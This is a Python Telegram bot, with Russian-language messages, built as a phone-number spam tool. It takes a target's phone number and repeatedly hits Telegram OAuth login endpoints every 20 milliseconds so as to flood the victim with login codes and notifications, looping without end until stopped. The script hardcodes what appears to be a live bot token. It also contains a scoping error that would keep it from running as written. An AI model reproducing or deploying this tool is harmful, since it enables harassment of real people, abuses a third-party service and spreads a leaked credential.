import asyncio
import aiohttp
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"

ENDPOINTS = [
    ("https://oauth.telegram.org/auth", "get", {"bot_id": "1852523856", "origin": "https://cabinet.presscode.app", "embed": "1", "return_to": "https://cabinet.presscode.app/login"}),
    ("https://oauth.telegram.org/auth/send", "post", {"phone": "{phone}"}),
    ("https://oauth.telegram.org/auth/request", "post", {"phone": "{phone}"}),
    ("https://oauth.telegram.org/login", "post", {"phone": "{phone}"}),
]

spam_tasks = {}
found_endpoint = None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Отправь номер (например, +380963836766) — бот сам переберет эндпоинты и начнет спамить уведомлениями.")

async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        task = spam_tasks.pop(chat_id)
        if not task.done():
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
        await update.message.reply_text("Остановлено")
    else:
        await update.message.reply_text("Нет активного спама")

async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global found_endpoint
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        await update.message.reply_text("Уже идёт, останови /stop")
        return
    phone = update.message.text.strip()
    if not phone.startswith('+'):
        await update.message.reply_text("Формат: +380...")
        return

    await update.message.reply_text(f"Запущено. Ищем рабочий эндпоинт для номера {phone}...")

    async def spam():
        nonlocal found_endpoint
        count = 0
        async with aiohttp.ClientSession() as session:
            while True:
                if found_endpoint is None:
                    for url, method, params in ENDPOINTS:
                        try:
                            if method == "get":
                                resp = await session.get(url, params={k: v.format(phone=phone) if isinstance(v, str) else v for k, v in params.items()}, timeout=5)
                            else:
                                data = {k: v.format(phone=phone) if isinstance(v, str) else v for k, v in params.items()}
                                resp = await session.post(url, data=data, timeout=5)
                            status = resp.status
                            text = await resp.text()
                            if status == 200 and ("success" in text.lower() or "code" in text.lower() or "sent" in text.lower()):
                                found_endpoint = (url, method, params)
                                await context.bot.send_message(chat_id, f"✅ Найден рабочий эндпоинт: {url} (метод {method})")
                                break
                            else:
                                await context.bot.send_message(chat_id, f"Пробую {url} -> {status}")
                        except Exception as e:
                            await context.bot.send_message(chat_id, f"Ошибка на {url}: {str(e)[:30]}")
                        await asyncio.sleep(0.02)
                    if found_endpoint is None:
                        await context.bot.send_message(chat_id, "❌ Не найден ни один эндпоинт. Попробуй другой номер или сайт.")
                        break
                else:
                    url, method, params = found_endpoint
                    try:
                        if method == "get":
                            resp = await session.get(url, params={k: v.format(phone=phone) if isinstance(v, str) else v for k, v in params.items()}, timeout=5)
                        else:
                            data = {k: v.format(phone=phone) if isinstance(v, str) else v for k, v in params.items()}
                            resp = await session.post(url, data=data, timeout=5)
                        status = resp.status
                        text = await resp.text()
                        count += 1
                        await context.bot.send_message(chat_id, f"Попытка #{count}: {status}, {text[:40]}")
                    except Exception as e:
                        await context.bot.send_message(chat_id, f"Ошибка: {str(e)[:30]}")
                    await asyncio.sleep(0.02)

    task = asyncio.create_task(spam())
    spam_tasks[chat_id] = task

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_spam))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_number))
    app.run_polling()

if __name__ == "__main__":
    main()
